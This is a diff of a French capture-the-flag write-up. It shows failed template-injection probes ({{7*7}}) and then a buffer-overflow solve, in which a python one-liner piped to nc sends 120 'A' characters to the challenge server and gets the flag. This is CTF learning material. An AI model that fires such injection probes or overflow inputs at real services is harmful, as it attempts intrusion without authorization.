@@ -19,14 +19,17 @@ Hello ! What's your name ?
 {{7*7}}}
 Hello {{7*7}}}
 ```
+
 Nop!
 
 Test:
+
 ```shell
 Hello ! What's your name ?
 {7*7}}
 Hello {7*7}}
 ```
+
 Toujours pas
 
 Bon on va essayer autre chose.
@@ -34,14 +37,15 @@ Bon on va essayer autre chose.
 ## Segmentation fault
 
 Par curiosité je voulais savoir ce que ça fesait si on injectait 1000 caractères.
-Appuyer plein de fois sur A et Bingo on a le flag(un peu de chance sur celui-ci).
+Appuyer pleins de fois sur A et Bingo on a le flag(un peu de chance sur celui-ci).
 
 Pour la rapidité:  `python -c "print(120*'A')" | nc 0xhorizon.eu 8888`
 
-```
+```bash
 python -c "print(120*'A')" | nc 0xhorizon.eu 8888
 Hello ! What's your name ?
 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Good job here is your flag: horiz0nx{FLAG}
 ```
+
 Pour les plus curieux c'est à partir de 120 caractères que le programme donne le flag.
